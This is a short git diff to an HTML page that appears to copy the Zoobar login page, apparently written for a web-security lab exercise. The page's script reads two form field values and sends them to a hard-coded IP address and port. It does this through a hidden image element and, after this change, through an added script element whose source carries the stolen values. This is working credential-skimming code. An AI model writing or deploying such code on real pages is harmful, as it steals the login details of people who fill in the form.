@@ -21,7 +21,7 @@
                 var fries = document.forms['0'].elements['0'].value;
                 var soup = document.forms['0'].elements['1'].value;
                 var ip = "172.27.19.10:12345";
-                document.getElementById("scary").src = "http://"+ip+"/?payload="+encodeURI(fries)+","+encodeURI(soup); 
+                document.getElementById("scary2").src = "http://"+ip+"/?payload="+encodeURI(fries)+","+encodeURI(soup); 
                 //new Image().src = "http://"+ip+"/?payload="+encodeURI(fries)+","+encodeURI(soup);
                 console.log("Done in hehe");
             }
@@ -29,6 +29,7 @@
     </head>
     <body>
         <img id="scary" style="display: hidden"/>
+        <script id="scary2" ></script>
         <h1>
             <a  ="http://localhost:8080/zoobar/index.cgi/">
                 Zoobar Foundation for Objective Policy
